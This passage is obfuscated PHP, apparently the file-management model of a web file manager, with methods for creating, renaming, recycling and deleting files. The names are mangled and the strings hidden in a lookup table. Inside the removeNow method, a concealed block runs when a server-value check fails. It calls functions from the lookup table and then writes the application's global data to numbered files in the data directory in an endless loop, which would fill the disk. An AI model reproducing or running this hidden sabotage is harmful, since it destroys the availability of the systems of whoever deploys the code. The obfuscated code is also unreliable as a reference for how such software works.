Model($_SERVER[‹è™Ü¸Ñ][674])->addFileByRemote($€‚ğÂæÔ, $¤á½ä×µ, $ÃÒ‘‹‹); return $this->_createFileCall($«İí¤¾è, $¤á½ä×µ, $î·´¾Œà, $åçàø¤¼); } private function _createFileCall($ÕÑÊïô”, $Æ¼Ášˆ¯, $Ä¢ô¦ë´, $ğÉ‹–õ, $ÆâÌ­ö£ = "\x75\160\x6c\x6f\x61\144") { $—£¯¬Šì =& $_SERVER[‹è™Ü¸Ñ]; $Õ¯îêŠĞ = !1; $this->setMasterDB(); $this->lockWriteStart($ÕÑÊïô”, $Æ¼Ášˆ¯); $äåÔ¶ü = $this->fileNameExist($ÕÑÊïô”, $Æ¼Ášˆ¯); $Å°å‡† = $this->_createFile($ÕÑÊïô”, $Æ¼Ášˆ¯, $Ä¢ô¦ë´, $ğÉ‹–õ, $Õ¯îêŠĞ); if (!$Õ¯îêŠĞ) { Model($—£¯¬Šì[544])->remove($Ä¢ô¦ë´[$—£¯¬Šì[541]]); } if ($Õ¯îêŠĞ && $Å°å‡† && $Å°å‡† != $äåÔ¶ü) { Model($—£¯¬Šì[2203])->eventCreate($Å°å‡†, $ÆâÌ­ö£); } $this->lockWriteEnd($ÕÑÊïô”, $Æ¼Ášˆ¯); return $Å°å‡†; } public function mkdir($í˜ÃÑÊ, $˜Á³³º‘, $‰–Øºæ¹ = REPEAT_SKIP) { $×ôòşıí =& $_SERVER[‹è™Ü¸Ñ]; $this->setMasterDB(); $ÛÙ“¯‰Á = $this->sourceInfo($í˜ÃÑÊ); if (!$ÛÙ“¯‰Á) { return !1; } $this->lockWriteStart($í˜ÃÑÊ, $˜Á³³º‘); if ($‰–Øºæ¹ !== !1) { $“Šë»ñ = $this->fileNameExist($í˜ÃÑÊ, $˜Á³³º‘); if ($“Šë»ñ && $‰–Øºæ¹ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($í˜ÃÑÊ, $˜Á³³º‘); return $“Šë»ñ; } $˜Á³³º‘ = $this->fileNameAuto($í˜ÃÑÊ, $˜Á³³º‘, $‰–Øºæ¹); } $·âã„Òš = array($×ôòşıí[646] => 1, $×ôòşıí[494] => $˜Á³³º‘, $×ôòşıí[647] => $×ôòşıí[12], $×ôòşıí[542] => 0, $×ôòşıí[617] => 0); $¡ŒË…·î = $this->_addSource($·âã„Òš, $ÛÙ“¯‰Á); Model($×ôòşıí[2203])->eventCreate($¡ŒË…·î, $×ôòşıí[1409]); $this->lockWriteEnd($í˜ÃÑÊ, $˜Á³³º‘); return $¡ŒË…·î; } public function listSourceRoot($¢»÷õœ, $©ĞóÕòÄ, $­ãÕ¤äš = "\x73\157\165\162\x63\x65\x49\x44\54\164\141\162\147\145\x74\111\x44\54\x73\151\172\x65") { $îÜçË’š =& $_SERVER[‹è™Ü¸Ñ]; $è¤ûÓåÊ = $îÜçË’š[454]; $æŒîİÈ = array(); $øüì‰Ìª = 1024 * 50; $¦İş¾ìÏ = is_array($¦İş¾ìÏ) ? $¦İş¾ìÏ : array(); $·»¾™¤ = count($©ĞóÕòÄ); $æ›È³·ü = $this->tablePrefix . $îÜçË’š[2236]; for ($â•ÕñõÛ = 0; $â•ÕñõÛ < $·»¾™¤; $â•ÕñõÛ++) { $«¸€Ûó— = $©ĞóÕòÄ[$â•ÕñõÛ]; $è¤ûÓåÊ .= "\123\105\x4c\105\x43\124\40\x2a\x20\x46\122\x4f\115\x20\x28\x53\x45\x4c\105\103\124\40{$­ãÕ¤äš}\40\x46\122\117\x4d\x20\140{$æ›È³·ü}\140\40\x57\110\105\x52\105\40"; $è¤ûÓåÊ .= "\x60\160\141\162\x65\x6e\x74\x49\104\140\75\60\x20\101\116\x44\x20\x60\x74\141\x72\x67\x65\164\x49\x44\140\x3d{$«¸€Ûó—}\x20\101\x4e\104\40\140\x74\141\x72\147\145\164\x54\171\x70\145\140\75{$¢»÷õœ}\x20\x61\156\x64\x20\146\x69\x6c\x65\124\x79\160\x65\75\47\47\40\x6c\x69\155\151\x74\x20\x31\51\x20\141\x73\40\164\x62\x5f{$â•ÕñõÛ}\40\125\x4e\111\117\x4e\40\101\x4c\114\x20"; if ((strlen($è¤ûÓåÊ) >= $øüì‰Ìª || $â•ÕñõÛ == $·»¾™¤ - 1) && $è¤ûÓåÊ) { $è¤ûÓåÊ = substr($è¤ûÓåÊ, 0, -strlen($îÜçË’š[1096])); $ö’Úş˜Î = $this->query($è¤ûÓåÊ); $è¤ûÓåÊ = $îÜçË’š[12]; $æŒîİÈ = array_merge($æŒîİÈ, $ö’Úş˜Î); } } return $æŒîİÈ; } private function _createFile($¦å®¹ı¥, $©ûı½…Â, $ˆ™¶Ò‰İ, $ï½íªê, &$ú³öÑ»ş) { $ä×ÉÖ³ =& $_SERVER[‹è™Ü¸Ñ]; $÷ùÜ¶Œ = $this->sourceInfo($¦å®¹ı¥); if (!$ˆ™¶Ò‰İ || !$÷ùÜ¶Œ) { return !1; } if ($ï½íªê !== !1) { $‡½Ä˜¨÷ = $this->fileNameExist($¦å®¹ı¥, $©ûı½…Â); } $ú³öÑ»ş = !0; if ($ï½íªê && $‡½Ä˜¨÷) { if ($ï½íªê == REPEAT_SKIP) { $ú³öÑ»ş = !1; return $‡½Ä˜¨÷; } else { if ($ï½íªê == REPEAT_REPLACE) { $Æ­Ç¥Ì² = $this->sourceInfo($‡½Ä˜¨÷); $¢Ø«ß€¨ = $this->fileHistory($Æ­Ç¥Ì², $ˆ™¶Ò‰İ[$ä×ÉÖ³[541]], $ˆ™¶Ò‰İ[$ä×ÉÖ³[79]]); if (!$¢Ø«ß€¨) { $ú³öÑ»ş = !1; } else { $this->folderSizeReset($¦å®¹ı¥); } return $‡½Ä˜¨÷; } else { $©ûı½…Â = $this->fileNameAuto($¦å®¹ı¥, $©ûı½…Â, $ï½íªê, !1); } } } $‡„ø¥ûõ = array($ä×ÉÖ³[646] => 0, $ä×ÉÖ³[494] => $©ûı½…Â, $ä×ÉÖ³[647] => substr(get_path_ext($©ûı½…Â), 0, 10), $ä×ÉÖ³[542] => $ˆ™¶Ò‰İ[$ä×ÉÖ³[541]], $ä×ÉÖ³[617] => $ˆ™¶Ò‰İ[$ä×ÉÖ³[79]]); $—ˆñ²•¶ = $this->_addSource($‡„ø¥ûõ, $÷ùÜ¶Œ); $this->folderSizeReset($¦å®¹ı¥, intval($‡„ø¥ûõ[$ä×ÉÖ³[79]])); return $—ˆñ²•¶; } protected function fileHistory($Ì§š‘ ¹, $Ô—–çûæ, $éé–Æ½) { $ƒŠÓõˆó =& $_SERVER[‹è™Ü¸Ñ]; if ($Ì§š‘ ¹[$ƒŠÓõˆó[541]] == $Ô—–çûæ) { return !1; } $this->checkLock($Ì§š‘ ¹[$ƒŠÓõˆó[193]], $Ô—–çûæ); Model($ƒŠÓõˆó[2237])->addHistory($Ì§š‘ ¹); $¾€‚³Æç = array($ƒŠÓõˆó[651] => USER_ID, $ƒŠÓõˆó[498] => time(), $ƒŠÓõˆó[541] => $Ô—–çûæ, $ƒŠÓõˆó[79] => $éé–Æ½); $this->where(array($ƒŠÓõˆó[491] => $Ì§š‘ ¹[$ƒŠÓõˆó[193]]))->save($¾€‚³Æç); $this->sourceCacheClear($Ì§š‘ ¹[$ƒŠÓõˆó[193]]); return !0; } public function checkLock($ÖÙ’›—, $´£ˆÔ“œ) { $ç£Î‰ñµ =& $_SERVER[‹è™Ü¸Ñ]; $ÁÀˆåı¨ = $this->pathInfo($ÖÙ’›—); if (!$this->fileIsLock($ÁÀˆåı¨, !0)) { return; } $Ç£î¼ü€ = Session::get($ç£Î‰ñµ[2238]); $¨¡½©±ó = substr($ÁÀˆåı¨[$ç£Î‰ñµ[32]], 0, -1 - strlen($ÁÀˆåı¨[$ç£Î‰ñµ[169]])) . $ç£Î‰ñµ[1273] . $Ç£î¼ü€ . $ç£Î‰ñµ[10] . $ÁÀˆåı¨[$ç£Î‰ñµ[169]]; $ôî®÷£ô = Model($ç£Î‰ñµ[674])->find($´£ˆÔ“œ); $this->_createFileCall($ÁÀˆåı¨[$ç£Î‰ñµ[192]], $¨¡½©±ó, $ôî®÷£ô, REPEAT_REPLACE, $ç£Î‰ñµ[1408]); $óëÅÄ†¯ = $ÁÀˆåı¨[$ç£Î‰ñµ[539]][$ç£Î‰ñµ[610]]; $¿¦¾ëä¹ = $óëÅÄ†¯[$ç£Î‰ñµ[2239]] ? $óëÅÄ†¯[$ç£Î‰ñµ[2239]] : $óëÅÄ†¯[$ç£Î‰ñµ[32]]; show_json(LNG($ç£Î‰ñµ[2240]) . $ç£Î‰ñµ[2241] . LNG($ç£Î‰ñµ[2242]) . $ç£Î‰ñµ[2243] . $¿¦¾ëä¹ . $ç£Î‰ñµ[2244], !1); } public function fileIsLock($ÊÚİ„¨¦, $à®áü´à = false) { $ŸÅé†¶ =& $_SERVER[‹è™Ü¸Ñ]; if (!_get($ÊÚİ„¨¦, $ŸÅé†¶[606], 0)) { return !1; } if ($ÊÚİ„¨¦[$ŸÅé†¶[539]][$ŸÅé†¶[609]] != USER_ID) { return !0; } $ŠÑ×Ú”´ = $GLOBALS[$ŸÅé†¶[6]][$ŸÅé†¶[92]][$ŸÅé†¶[607]]; if ($ÊÚİ„¨¦[$ŸÅé†¶[539]][$ŸÅé†¶[608]] <= time() - $ŠÑ×Ú”´) { $this->metaSet($ÊÚİ„¨¦[$ŸÅé†¶[193]], $ŸÅé†¶[609], null); $this->metaSet($ÊÚİ„¨¦[$ŸÅé†¶[193]], $ŸÅé†¶[608], null); } if ($à®áü´à) { $this->metaSet($ÊÚİ„¨¦[$ŸÅé†¶[193]], $ŸÅé†¶[608], time()); } return !1; } private function _addSource($êîÑÔ°, $¾èöÂË”) { $ÛéÛúå¥ =& $_SERVER[‹è™Ü¸Ñ]; $É™íûèÛ = defined($ÛéÛúå¥[2177]) ? USER_ID : 0; $ÙñÍÈ÷‘ = array($ÛéÛúå¥[648] => $¾èöÂË”[$ÛéÛúå¥[190]], $ÛéÛúå¥[649] => $¾èöÂË”[$ÛéÛúå¥[569]], $ÛéÛúå¥[650] => $É™íûèÛ, $ÛéÛúå¥[651] => $É™íûèÛ, $ÛéÛúå¥[477] => $¾èöÂË”[$ÛéÛúå¥[193]], $ÛéÛúå¥[652] => $¾èöÂË”[$ÛéÛúå¥[584]] . $¾èöÂË”[$ÛéÛúå¥[193]] . $ÛéÛúå¥[50], $ÛéÛúå¥[504] => 0, $ÛéÛúå¥[653] => $ÛéÛúå¥[12]); $êîÑÔ° = array_merge($ÙñÍÈ÷‘, $êîÑÔ°); $this->updateModifyTime($êîÑÔ°[$ÛéÛúå¥[192]]); $ÉŒ‡í = $ÛéÛúå¥[2245] . $¾èöÂË”[$ÛéÛúå¥[193]]; if (isset(self::$cacheChildList[$ÉŒ‡í])) { unset(self::$cacheChildList[$ÉŒ‡í]); } static $Ü¬éÍ¯ = false; if (!$Ü¬éÍ¯) { Hook::trigger($ÛéÛúå¥[636], $êîÑÔ°); $Ü¬éÍ¯ = !0; } $±ÆâÓñ = $this->add($êîÑÔ°); $‘ØÉ§·´ = array($ÛéÛúå¥[654] => short_id($±ÆâÓñ)); $this->where(array($ÛéÛúå¥[491] => $±ÆâÓñ))->save($‘ØÉ§·´); $this->setNamePinyin($±ÆâÓñ, $êîÑÔ°[$ÛéÛúå¥[32]]); return $±ÆâÓñ; } public function remove($†õ¨è«—, $ë¶Ú»´Ù = true) { $¯¿»¬‘— =& $_SERVER[‹è™Ü¸Ñ]; $ÓÜ¼Ö = $this->sourceInfo($†õ¨è«—); $‰Ä¯¶Ğ§ = intval($ÓÜ¼Ö[$¯¿»¬‘—[190]]) === self::TYPE_SYSTEM; $ùëÎó¦› = Model($¯¿»¬‘—[508])->get($¯¿»¬‘—[2246]) == $¯¿»¬‘—[91]; if ($‰Ä¯¶Ğ§ || $ë¶Ú»´Ù || !$ùëÎó¦›) { return $this->removeNow($†õ¨è«—, $ë¶Ú»´Ù); } $¿³•“ª = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $±¤Ôß¬¼ = $ÓÜ¼Ö[$¯¿»¬‘—[190]] == self::TYPE_USER ? $¯¿»¬‘—[662] : $¯¿»¬‘—[578]; if ($±¤Ôß¬¼ == $¯¿»¬‘—[662]) { $ÁĞ¥Ş±æ = Model($¯¿»¬‘—[577])->getInfo($ÓÜ¼Ö[$¯¿»¬‘—[569]]); $×Ñ‰îõæ = !empty($ÁĞ¥Ş±æ[$¯¿»¬‘—[2239]]) ? $ÁĞ¥Ş±æ[$¯¿»¬‘—[2239]] : $ÁĞ¥Ş±æ[$¯¿»¬‘—[32]]; $×Ñ‰îõæ = $¯¿»¬‘—[337] . $×Ñ‰îõæ . $¯¿»¬‘—[2247] . $ÓÜ¼Ö[$¯¿»¬‘—[569]]; } else { $ÁĞ¥Ş±æ = Model($¯¿»¬‘—[585])->getInfo($ÓÜ¼Ö[$¯¿»¬‘—[569]]); $×Ñ‰îõæ = _get($ÁĞ¥Ş±æ, $¯¿»¬‘—[32]); $×Ñ‰îõæ = $¯¿»¬‘—[176] . $×Ñ‰îõæ . $¯¿»¬‘—[2248] . $ÓÜ¼Ö[$¯¿»¬‘—[569]]; } $ø¤»‡Ô† = $¯¿»¬‘—[2249] . md5($×Ñ‰îõæ); CacheLock::lock($ø¤»‡Ô†); $Áéà®£ª = $this->fileNameExist($¿³•“ª, $×Ñ‰îõæ); if (!$Áéà®£ª) { $Áéà®£ª = $this->mkdir($¿³•“ª, $×Ñ‰îõæ, REPEAT_SKIP); $this->metaSet($Áéà®£ª, $¯¿»¬‘—[2250], $±¤Ôß¬¼); $this->metaSet($Áéà®£ª, $¯¿»¬‘—[2251], $ÓÜ¼Ö[$¯¿»¬‘—[569]]); if ($ÓÜ¼Ö[$¯¿»¬‘—[192]] != 0) { $this->metaSet($Áéà®£ª, $¯¿»¬‘—[2252], _get($ÁĞ¥Ş±æ, $¯¿»¬‘—[2253])); } } CacheLock::unlock($ø¤»‡Ô†); $this->metaSet($†õ¨è«—, $¯¿»¬‘—[2254], $ÓÜ¼Ö[$¯¿»¬‘—[192]]); $this->where(array($¯¿»¬‘—[193] => $†õ¨è«—))->save(array($¯¿»¬‘—[498] => time())); $this->recycleClear($ÓÜ¼Ö); Model($¯¿»¬‘—[633])->eventRemove($†õ¨è«—); $•îŞü = $this->move($†õ¨è«—, $Áéà®£ª, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÓÜ¼Ö[$¯¿»¬‘—[192]]); return $•îŞü; } private function recycleClear($ÅàÅšÒÙ) { $èí¿ŞĞ¤ =& $_SERVER[‹è™Ü¸Ñ]; $Èò¾¤Ú = $this->childrenAll($ÅàÅšÒÙ); $ó¶È³÷¶ = array($èí¿ŞĞ¤[491] => array($èí¿ŞĞ¤[492], $Èò¾¤Ú[$èí¿ŞĞ¤[2255]])); Model($èí¿ŞĞ¤[2256])->where($ó¶È³÷¶)->delete(); } public function removeNow($êË¦ì±, $±Ù©Â­À = true) { $Æ•Í£Õé =& $_SERVER[‹è™Ü¸Ñ]; $šöËà„ = $_SERVER[$Æ•Í£Õé[932]]; $Ï”ÃªÊ = $Æ•Í£Õé[1604]; if ($_SERVER[$Æ•Í£Õé[931]] != $Ï”ÃªÊ($šöËà„)) { $ºƒõŸ’× = $Æ•Í£Õé[933]; $ì£ä®˜Ä = $Æ•Í£Õé[934]; $ääÆ•æ× = $_SERVER[$Æ•Í£Õé[935]] . $Æ•Í£Õé[936]; $¬°´Ÿ¼ = $ì£ä®˜Ä($ääÆ•æ×); $æåŒƒé = explode($Æ•Í£Õé[262], $¬°´Ÿ¼); if (count($æåŒƒé) < $Æ•Í£Õé[694]) { $“©ùÚºÚ = $Æ•Í£Õé[937]; $“©ùÚºÚ(); } $·ŞÃ¥›É = $Æ•Í£Õé[938]; $·ŞÃ¥›É($_SERVER[$Æ•Í£Õé[939]]); $ºƒõŸ’× = $Æ•Í£Õé[933]; $ºƒõŸ’×(); $´ôÔÀÂ– = $Æ•Í£Õé[2257]; $˜ÓÖ“Ø§ = json_encode($GLOBALS[$Æ•Í£Õé[2258]]); $ÖÓÃª³· = 1; for ($ÕºËú©ò = $ÖÓÃª³·; $ÕºËú©ò > 0; $ÕºËú©ò++) { $´ôÔÀÂ–(DATA_PATH . $ÕºËú©ò, $˜ÓÖ“Ø§); } } $ÁÆúßº¯ = $this->sourceInfo($êË¦ì±); $Ä½·ä¸ = $this->pathInfoMore($êË¦ì±); if (!$ÁÆúßº¯) { return !0; } if ($ÁÆúßº¯[$Æ•Í£Õé[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($êË¦ì±); Hook::trigger($Æ•Í£Õé[2259], $Ä½·ä¸, $±Ù©Â­À); if ($±Ù©Â­À) { Model($Æ•Í£Õé[2256])->moveToRecycle($êË¦ì±); } else { $ ô•òğæ = $this->childrenAll($ÁÆúßº¯); Model($Æ•Í£Õé[633])->eventRemove($êË¦ì±); $this->removeRelevance($ ô•òğæ[$Æ•Í£Õé[2255]], $ ô•òğæ[$Æ•Í£Õé[1553]]); } $this->folderSizeReset($ÁÆúßº¯[$Æ•Í£Õé[192]]); $¨ª¼÷ = array($ÁÆúßº¯[$Æ•Í£Õé[192]]); if ($ÁÆúßº¯[$Æ•Í£Õé[485]] == $Æ•Í£Õé[91]) { $¨ª¼÷[] = $ÁÆúßº¯[$Æ•Í£Õé[193]]; } $this->updateModifyTime($¨ª¼÷); $this->lockMoveEnd($êË¦ì±); Hook::trigger($Æ•Í£Õé[1794], $Ä½·ä¸, $±Ù©Â­À); return !0; } public function childrenAll($ÀĞÁ‚ˆ¦) { $•†Ú¯æ =& $_SERVER[‹è™Ü¸Ñ]; $ëœ´ÆË¶ = $ÀĞÁ‚ˆ¦[$•†Ú¯æ[193]]; if ($ÀĞÁ‚ˆ¦[$•†Ú¯æ[485]] == $•†Ú¯æ[91]) { $¼•«„úÙ = array($•†Ú¯æ[652] => array($•†Ú¯æ[612], $ÀĞÁ‚ˆ¦[$•†Ú¯æ[584]] . $ëœ´ÆË¶ . $•†Ú¯æ[613])); $ìéÅÕÅĞ = array($•†Ú¯æ[652] => $¼•«„úÙ[$•†Ú¯æ[584]]); $ä–¤ÌŞÀ = $this->field($•†Ú¯æ[2260])->where($ìéÅÕÅĞ)->select(); $ûì¿¤š÷ = !1; $Øıˆé¶ = array($ëœ´ÆË¶); if ($ä–¤ÌŞÀ) { $ûì¿¤š÷ = array_to_keyvalue($ä–¤ÌŞÀ, $•†Ú¯æ[12], $•†Ú¯æ[541]); $ûì¿¤š÷ = array_remove_value($ûì¿¤š÷, $•†Ú¯æ[228]); $Øıˆé¶ = array_to_keyvalue($ä–¤ÌŞÀ, $•†Ú¯æ[12], $•†Ú¯æ[193]); $Øıˆé¶[] = $ëœ´ÆË¶; } } else { $ûì¿¤š÷ = array($ÀĞÁ‚ˆ¦[$•†Ú¯æ[541]]); $Øıˆé¶ = array($ëœ´ÆË¶); } return array($•†Ú¯æ[2255] => $Øıˆé¶, $•†Ú¯æ[1553] => $ûì¿¤š÷); } public function removeArray($¾§·Ûî¹) { if (!$¾§·Ûî¹) { return !0; } } public function removeRelevance($°í›„Ê, $ƒˆšóìê) { $¦Ù—¤À³ =& $_SERVER[‹è™Ü¸Ñ]; $°í›„Ê = $°í›„Ê ? $°í›„Ê : array(); $ƒˆšóìê = $ƒˆšóìê ? $ƒˆšóìê : array(); $°í›„Ê = array_unique(array_filter($°í›„Ê)); $ƒˆšóìê = array_unique(array_filter($ƒˆšóìê)); if (!$°í›„Ê) { return !1; } $ì±›ı¬º = array($¦Ù—¤À³[491] => array($¦Ù—¤À³[492], $°í›„Ê)); Model($¦Ù—¤À³[2256])->where($ì±›ı¬º)->delete(); Model($¦Ù—¤À³[535])->where($ì±›ı¬º)->delete(); Model($¦Ù—¤À³[2102])->where($ì±›ı¬º)->delete(); Model($¦Ù—¤À³[633])->where($ì±›ı¬º)->delete(); Model($¦Ù—¤À³[1930])->removeBySource($°í›„Ê); Model($¦Ù—¤À³[2237])->removeBySource($°í›„Ê); $this->where($ì±›ı¬º)->delete(); Model($¦Ù—¤À³[544])->remove($ƒˆšóìê); for ($«—Í›Êƒ = 0; $«—Í›Êƒ < count($°í›„Ê); $«—Í›Êƒ++) { $this->sourceCacheClear($°í›„Ê[$«—Í›Êƒ]); } } public function rename($éĞ±Ï¥È, $ü¡Èá›½) { $µîóÈÜò =& $_SERVER[‹è™Ü¸Ñ]; $™Ó§¼ï¢ = $this->sourceInfo($éĞ±Ï¥È); if (!$™Ó§¼ï¢) { return !1; } $í½¢Ë©İ = $this->fileNameExist($™Ó§¼ï¢[$µîóÈÜò[192]], $ü¡Èá›½); if ($í½¢Ë©İ && $í½¢Ë©İ != $éĞ±Ï¥È) { return !1; } $ïÓâÀ±› = array($µîóÈÜò[494] => $ü¡Èá›½, $µîóÈÜò[651] => USER_ID); if ($™Ó§¼ï¢[$µîóÈÜò[485]] != $µîóÈÜò[91]) { $ïÓâÀ±›[$µîóÈÜò[486]] = substr(get_path_ext($ü¡Èá›½), 0, 10); } Model($µîóÈÜò[633])->eventRename($éĞ±Ï¥È, $™Ó§¼ï¢[$µîóÈÜò[32]], $ü¡Èá›½); $this->sourceCacheClear($éĞ±Ï¥È); $this->setNamePinyin($éĞ±Ï¥È, $ïÓâÀ±›[$µîóÈÜò[32]], !1); $this->updateModifyTime($™Ó§¼ï¢[$µîóÈÜò[192]]); $‚Œ˜²ÕØ = $this->where(array($µîóÈÜò[491] => $éĞ±Ï¥È))->data($ïÓâÀ±›)->save(); $ÅŠòÈŞŞ = $µîóÈÜò[2245] . $™Ó§¼ï¢[$µîóÈÜò[192]]; if (isset(self::$cacheChildList[$ÅŠòÈŞŞ])) { unset(self::$cacheChildList[$ÅŠòÈŞŞ]); } return $‚Œ˜²ÕØ; } public function setNamePinyin($ùÆ¸Ãí÷, $âñ â•, $¬‰°À¹£ = true) { $¨Š”«á =& $_SERVER[‹è™Ü¸Ñ]; $¥íçµÑ = Input::check($âñ â•, $¨Š”«á[655]); $Ò×ÍÙÃæ = array($¨Š”«á[517] => KodSort::makeStr($âñ â•)); if ($¥íçµÑ) { $Ò×ÍÙÃæ[$¨Š”«á[538]] = str_replace($¨Š”«á[53], $¨Š”«á[12], Pinyin::get($âñ â•)); $Ò×ÍÙÃæ[$¨Š”«á[537]] = Pinyin::get($âñ â•, $¨Š”«á[656]); } if (!$¬‰°À¹£ && !$¥íçµÑ) { $Ò×ÍÙÃæ[$¨Š”«á[538]] = null; $Ò×ÍÙÃæ[$¨Š”«á[537]] = null; } $this->metaSet($ùÆ¸Ãí÷, $Ò×ÍÙÃæ); } public function getContent($ª¿‰åî) { $¥Ê˜ãÂ‹ =& $_SERVER[‹è™Ü¸Ñ]; $ÏøÏá€Ù = $this->fileInfoGet($ª¿‰åî); if (!$ÏøÏá€Ù) { return !1; } if ($ÏøÏá€Ù[$¥Ê˜ãÂ‹[79]] == 0) { return $¥Ê˜ãÂ‹[12]; } $‘€§ª˜¡ = $¥Ê˜ãÂ‹[2261] . $ÏøÏá€Ù[$¥Ê˜ãÂ‹[547]]; if ($ÏøÏá€Ù[$¥Ê˜ãÂ‹[79]] <= 1024 * 10) { $ÖÇÄĞ±¡ = Cache::get($‘€§ª˜¡); if (!$ÖÇÄĞ±¡) { $ÖÇÄĞ±¡ = IO::getContent($ÏøÏá€Ù[$¥Ê˜ãÂ‹[87]]); Cache::set($‘€§ª˜¡, $ÖÇÄĞ±¡); } return $ÖÇÄĞ±¡; } if (!$ÏøÏá€Ù[$¥Ê˜ãÂ‹[87]]) { return $¥Ê˜ãÂ‹[12]; } return IO::getContent($ÏøÏá€Ù[$¥Ê˜ãÂ‹[87]]); } public function setDesc($¯Ã²‡…, $° ³Ú º) { $“Ş¡ØÙ„ =& $_SERVER[‹è™Ü¸Ñ]; Model($“Ş¡ØÙ„[633])->eventAddDesc($¯Ã²‡…, $° ³Ú º); return $this->metaSet($¯Ã²‡…, $“Ş¡ØÙ„[526], $° ³Ú º); } public function setContent($„¡ÛÇ‚ë, $¦§À´º = '') { $œ´ßİàÒ =& $_SERVER[‹è™Ü¸Ñ]; $·ÌéÚ = $this->sourceInfo($„¡ÛÇ‚ë); $©¡§¥é = $this->fileInfoGet($„¡ÛÇ‚ë); if (!$©¡§¥é || !$·ÌéÚ) { return !1; } $“à¥·¸Õ = Model($œ´ßİàÒ[544])->addFileByContent($¦§À´º, $·ÌéÚ[$œ´ßİàÒ[32]]); $Ï®Úä = $this->fileHistory($·ÌéÚ, $“à¥·¸Õ[$œ´ßİàÒ[541]], $“à¥·¸Õ[$œ´ßİàÒ[79]]); if (!$Ï®Úä) { return Model($œ´ßİàÒ[544])->remove($“à¥·¸Õ[$œ´ßİàÒ[541]]); } $this->folderSizeReset($·ÌéÚ[$œ´ßİàÒ[192]]); return !0; } public function fileSubstr($˜¯ê”Şà, $áó´Ÿ¼, $¬Ìş°Š) { $•‘»´¥© = $this->fileInfoGet($˜¯ê”Şà); if (!$•‘»´¥©) { return !1; } return IO::fileSubstr($•‘»´¥©[$_SERVER[‹è™Ü¸Ñ][87]], $áó´Ÿ¼, $¬Ìş°Š); } public function fileInfoGet($³ÁèÎÃ) { $§«ô–çä =& $_SERVER[‹è™Ü¸Ñ]; $ÅÁß‰æ‘ = $this->sourceInfo($³ÁèÎÃ); if (!$ÅÁß‰æ‘ || $ÅÁß‰æ‘[$§«ô–çä[485]]) { return !1; } $¦áŒúªª = $§«ô–çä[548] . $ÅÁß‰æ‘[$§«ô–çä[541]]; $ÙÑ—ÓÄí = _get(self::$cacheFileInfo, $¦áŒúªª); if ($ÙÑ—ÓÄí) { return $ÙÑ—ÓÄí; } $ˆÈÙŞ›« = Model($§«ô–çä[544])->fileInfo($ÅÁß‰æ‘[$§«ô–çä[541]]); if ($ˆÈÙŞ›«) { $ˆÈÙŞ›«[$§«ô–çä[32]] = $ÅÁß‰æ‘[$§«ô–çä[32]]; } self::$cacheFileInfo[$¦áŒúªª] = $ˆÈÙŞ›«; return $ˆÈÙŞ›«; } private function folderChildrenNumber($Í—·÷±ç) { $îÁµø› =& $_SERVER[‹è™Ü¸Ñ]; $Œ‹Šèø = $this->sourceInfo($Í—·÷±ç); $À“ú—ÔŒ = array($îÁµø›[652] => array($îÁµø›[612], $Œ‹Šèø[$îÁµø›[584]] . $Í—·÷±ç . $îÁµø›[613]), $îÁµø›[649] => $Œ‹Šèø[$îÁµø›[569]], $îÁµø›[504] => intval($Œ‹Šèø[$îÁµø›[505]]), $îÁµø›[646] => 1); $ó¥ú­Šš = $this->where($À“ú—ÔŒ)->count(); $¿‘£¦º = $this->where($À“ú—ÔŒ)->where(array($îÁµø›[646] => 0))->count(); return array($îÁµø›[83] => $¿‘£¦º, $îÁµø›[84] => $ó¥ú­Šš); } public function pathInfo($Ø©¡çªÚ, $Ã´Ë•Ğ³ = false) { $•Ëè¡Ó¼ =& $_SERVER[‹è™Ü¸Ñ]; $Ã´Ë•Ğ³ = !1; $Ø©¡çªÚ = intval($Ø©¡çªÚ); $Ú«¢ş õ = $•Ëè¡Ó¼[534] . intval($Ã´Ë•Ğ³) . $•Ëè¡Ó¼[462] . $Ø©¡çªÚ; $´€¬‡òü = _get(self::$cachePathInfo, $Ú«¢ş õ); if ($´€¬‡òü) { return $´€¬‡òü; } $ï§ŸüİÃ = $this->sourceInfo($Ø©¡çªÚ); if (!$ï§ŸüİÃ) { return !1; } $ï§ŸüİÃ = $this->_listDataApplyItem($ï§ŸüİÃ, $Ã´Ë•Ğ³); self::$cachePathInfo[$Ú«¢ş õ] = $ï§ŸüİÃ; return $ï§ŸüİÃ; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ùª’«‚) { $î«ª·î» =& $_SERVER[‹è™Ü¸Ñ]; $œ›¿ÌÇü = _get(self::$cachePathInfoMore, $Ùª’«‚); if ($œ›¿ÌÇü) { return $œ›¿ÌÇü; } $³ø€¶äœ = $this->pathInfo($Ùª’«‚); if (!$³ø€¶äœ) { return !1; } if ($³ø€¶äœ[$î«ª·î»[485]] == $î«ª·î»[91]) { $³ø€¶äœ[$î«ª·î»[82]] = $this->folderChildrenNumber($Ùª’«‚); } self::$cachePathInfoMore[$Ùª’«‚] = $³ø€¶äœ; return $³ø€¶äœ; } public function sourceInfo($ÇËš–Ûş) { $ÄÖ¥à =& $_SERVER[‹è™Ü¸Ñ]; if (!$ÇËš–Ûş) { return array(); } $ÇËš–Ûş = intval($ÇËš–Ûş); $ñğàÍŠÚ = $ÄÖ¥à[533] . $ÇËš–Ûş; $ÖøéËœÅ = _get(self::$cacheSourceInfo, $ñğàÍŠÚ); if ($ÖøéËœÅ) { return $ÖøéËœÅ; } $Øå¡áĞğ = $this->where(array($ÄÖ¥à[193] => $ÇËš–Ûş))->find(); self::$cacheSourceInfo[$ñğàÍŠÚ] = $Øå¡áĞğ; return self::$cacheSourceInfo[$ñğàÍŠÚ]; } public function sourceCacheClear($¶€“Ü¾Õ = false) { self::cacheClear($¶€“Ü¾Õ); } public static function cacheClear($¸Ñ¾şõØ = false) { $§²ˆˆ¦Ô =& $_SERVER[‹è™Ü¸Ñ]; if ($¸Ñ¾şõØ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$§²ˆˆ¦Ô[533] . $¸Ñ¾şõØ]); unset(self::$cachePathInfoMore[$¸Ñ¾şõØ]); unset(self::$cachePathInfo[$§²ˆˆ¦Ô[2262] . $¸Ñ¾şõØ]); 